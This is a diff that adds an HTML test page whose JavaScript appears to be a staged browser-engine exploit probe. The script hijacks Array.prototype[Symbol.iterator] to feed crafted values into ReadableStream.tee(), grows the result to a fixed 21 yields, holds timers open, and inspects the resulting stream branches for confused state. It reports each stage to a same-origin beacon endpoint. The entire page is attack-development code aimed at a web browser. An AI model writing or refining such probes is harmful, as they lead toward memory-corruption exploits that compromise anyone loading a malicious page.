@@ -1,0 +1,45 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>ESC1-C — KPIN disambiguator (21-yield grow + 24 supervisor holds, cross-task)</title></head>
+<body><pre id="out">ESC1-C…</pre>
+<script>
+(function(){"use strict";
+var RID="exc"+Date.now().toString(36).slice(-14);
+function bks(s,b){try{var x=new XMLHttpRequest();x.open("POST","/beacon/E3x-"+s,false);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({r:RID,b:String(b).slice(0,230)}));}catch(e){}}
+function ba(s,b){try{fetch("/beacon/E3x-"+s,{method:"POST",cache:"no-store",headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,230)})}).catch(function(){});}catch(e){}}
+var OI=Array.prototype[Symbol.iterator];function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function mkt(){var rs=new ReadableStream({});return rs.tee();}
+var HB=null;bks("L","esc1-c");
+
+/* S0 DIAG-CAP (stash + counter) — igual que ESC1-B */
+window.__N=0;window.__T="";window.__CAP=null;
+Array.prototype[Symbol.iterator]=function(){var t=this;window.__N=(window.__N|0)+1;
+ try{window.__T="len="+(t&&t.length)+"|t0="+typeof t[0]+"|same="+(t[0]===t[1]);}catch(e){window.__T="E:"+e.message;}
+ if(window.__CAP===null&&t&&t.length>=2&&typeof t[0]==="object")window.__CAP=[t[0],t[1]];
+ var i=0;return{next:function(){if(i>=2)return{done:true};var v=t[i];i++;return{value:v,done:false};}};};
+var D2=0,aa=[7,8];for(var v of aa)D2++;
+try{mkt();}catch(e){}
+rst();bks("S0","D2="+D2+";N="+window.__N+";T="+window.__T+";cap="+(window.__CAP?typeof window.__CAP[0]:"null"));
+
+/* S2-PIN: grow EXACTO 21 yields → 24 supervisor-holds (Kfn función) → observe tras 2600ms — NO marca crash-class antes de la ventana */
+clearInterval(HB);
+var X=window.__X||(window.__X={ourTag:"exc"});
+var g="ok",e0="";
+Array.prototype[Symbol.iterator]=function(){var i=0;return{next:function(){if(i>=21)return{done:true};i++;return{value:X,done:false};}};};
+try{mkt();}catch(e){g="E:"+String(e.message||e).slice(0,40);}rst();
+var Kfn=window.__KFN||(window.__KFN=function(){});
+var ids=[];
+for(var k=0;k<24;k++){try{ids.push(setTimeout(Kfn,9000000));}catch(e2){}}
+bks("S1","grow="+g+";holds=24");
+setTimeout(function(){
+  Array.prototype[Symbol.iterator]=function(){var i=0;return{next:function(){if(i>=1)return{done:true};i++;return{value:X,done:false};}};};
+  var pB=null,e1="";try{pB=mkt();}catch(e){e1="E:"+String(e.message||e).slice(0,40);}rst();
+  for(var j=0;j<ids.length;j++)clearTimeout(ids[j]);
+  var at=pB?typeof pB[1]:"nopB",l="-",orc="-";
+  try{l=String(pB[1].locked).slice(0,8);}catch(e2){l="E";}
+  try{var f=false,s=false;try{pB[0].cancel();}catch(e3){f=true;}try{pB[1].cancel();}catch(e4){s=true;}orc="c0t="+f+";c1t="+s;}catch(e5){}
+  bks("S2","a="+at+";l="+l+";"+orc+";e="+e1);
+  HB=setInterval(function(){ba("HB","hb");},2000);
+  ba("Z","ESC1-C complete");
+},800);
+})();
+</script></body></html>
